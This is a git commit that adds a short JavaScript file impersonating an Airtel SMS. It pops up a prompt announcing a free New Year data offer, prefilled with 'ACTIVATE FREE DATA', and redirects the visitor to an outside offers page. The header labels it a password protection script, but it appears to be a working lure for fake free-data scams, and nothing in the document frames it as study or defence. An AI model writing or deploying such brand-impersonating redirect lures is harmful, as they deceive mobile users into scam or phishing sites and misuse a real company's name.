e768c6d3216552d4d48ec09a75286186d445e7f1
ukpeha2026-maker <ukpeha2026@gmail.com>
2026-01-01 08:43:57 +0100

    Create airtel-active.js

---
+++ airtel-active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'ACTIVATE FREE DATA'
+password = prompt(
+  'SMS: Congratulations! Your Airtel number is eligible to receive New Year Offer. Please press OK to Actiavte Data now.',
+  'ACTIVATE FREE DATA'
+);
+if (password != 'ACTIVATE FREE DATA') {
+  location.href = 'https://offres.org/airtel-newyr.html';
+}
